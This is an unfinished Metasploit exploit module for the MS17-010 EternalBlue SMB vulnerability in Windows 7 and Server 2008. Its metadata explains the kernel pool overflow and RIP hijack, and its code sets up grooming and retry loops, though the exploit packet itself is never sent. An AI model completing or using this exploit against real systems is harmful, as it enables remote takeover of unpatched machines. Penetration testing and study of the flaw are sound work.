# This module is a work in progress, do not use it yet.

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS17-010 EternalBlue SMBv1/SMBv2 Kernel Pool Corruption',
      'Description'    => %q{
        This module is a port of the Equation Group EternalBlue exploit, part of
        the FuzzBunch toolkit released by Shadow Brokers.

        There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
        is calculated in Srv!SrvOs2FeaListSizeToNt, with logical error where a DWORD
        is subtracted into a WORD. The kernel pool is groomed so that overflow is
        well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
        completed in srvnet!SrvNetCommonReceiveHandler.

        This exploit, like the original may not trigger 100% of the time, and should be
        run continuously until triggered.
      },

      'Author'         => [
        'Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0
        'Dylan Davis <dylan.davis@risksense.com>',  # @jennamagius
        'Equation Group',
        'Shadow Brokers'
       ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'MSB', 'MS17-010' ],
          [ 'CVE', '2017-0143' ],
          [ 'CVE', '2017-0144' ],
          [ 'CVE', '2017-0145' ],
          [ 'CVE', '2017-0146' ],
          [ 'CVE', '2017-0147' ],
          [ 'CVE', '2017-0148' ],
          [ 'URL', 'https://github.com/RiskSense-Ops/MS17-010' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'           => 1024,
          'EncoderType'     => Msf::Encoder::Type::Raw,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 7 and Server 2008 (x64) All Service Packs',
            {
              'Platform'       => 'win',
              'Arch'           => [ ARCH_X64 ],
              # todo: ring0 opaque offsets
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'March 14, 2017'
    ))

    register_options(
      [
        Opt::RPORT(445),
        OptInt.new( 'MaxExploitAttempts', [ true,  "The number of times to retry the exploit.", 3 ] ),
        OptInt.new( 'GroomAllocations', [ true,  "The number of times to groom the kernel pool.", 12 ] ),
        OptInt.new( 'GroomDelta', [ true,  "The amount to increase the groom count by per try.", 5 ] )
      ])
  end

  def check
    # todo: create MS17-010 mixin, and hook up auxiliary/scanner/smb/smb_ms17_010
  end

  def exploit
    begin
      for i in 1..datastore['MaxExploitAttempts']

        grooms = datastore['GroomAllocations'] + datastore['GroomDelta'] * (i - 1)

        smb_eternalblue(datastore['RHOST'], datastore['RPORT'], payload.encoded, grooms)

        if handler == Msf::Handler::Claimed
          break
        end
      end

    rescue => error
      puts error.message
      puts error.backtrace
    ensure
      #disconnect
    end
  end

  #
  # Increase the default delay by five seconds since some kernel-mode
  # payloads may not run immediately.
  #
  def wfs_delay
    super + 5
  end

  def groom_thread(groom_id, ip, port, payload)
    # send first part of groom
    vprint_status("Sending groom allocation in thread #{groom_id}.")

    # wait to keep going
    while @grooms_mutex.locked?
      sleep 0
    end

    vprint_status("Closing groom thread. #{groom_id}")
  end

  def smb_eternalblue_start_grooms(ip, port, payload, grooms)
    @grooms_mutex = Mutex.new
    @grooms_mutex.lock

    @groom_threads = []

    grooms.times do |groom_id|
      @groom_threads << Thread.new do |thread_id|
        groom_thread(groom_id, ip, port, payload)
      end
    end
  end

  def smb_eternalblue_finish_grooms()
    @grooms_mutex.unlock
    @groom_threads.each do |t|
      t.join
    end
  end

  def smb_eternalblue(ip, port, payload, grooms)
    begin
      print_status("Attempting exploit with #{grooms} grooms.")
      print_status("Connecting to the target (#{datastore['RHOST']}:#{datastore['RPORT']})...")

      #client1 = create_smb_connection(true, false)
      #client1.tree_connect("\\\\#{datastore['RHOST']}\\IPC$")

      print_status("Sending all but last fragment of exploit packet")

      print_status("Starting non-paged pool grooming")

      smb_eternalblue_start_grooms(ip, port, payload, grooms)

      sleep 5

      smb_eternalblue_finish_grooms()

    ensure
      if @grooms_mutex.locked?
        @grooms_mutex.unlock
      end
    end
  end

  def create_smb_connection(smb1_enabled, smb2_enabled)
    sock = TCPSocket.new datastore['RHOST'], datastore['RPORT']
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)
    client = RubySMB::Client.new(dispatcher, smb1: smb1_enabled, smb2: smb2_enabled, username: '', password: '', domain: '')
    client.negotiate

    client.authenticate

    return client
  end

end
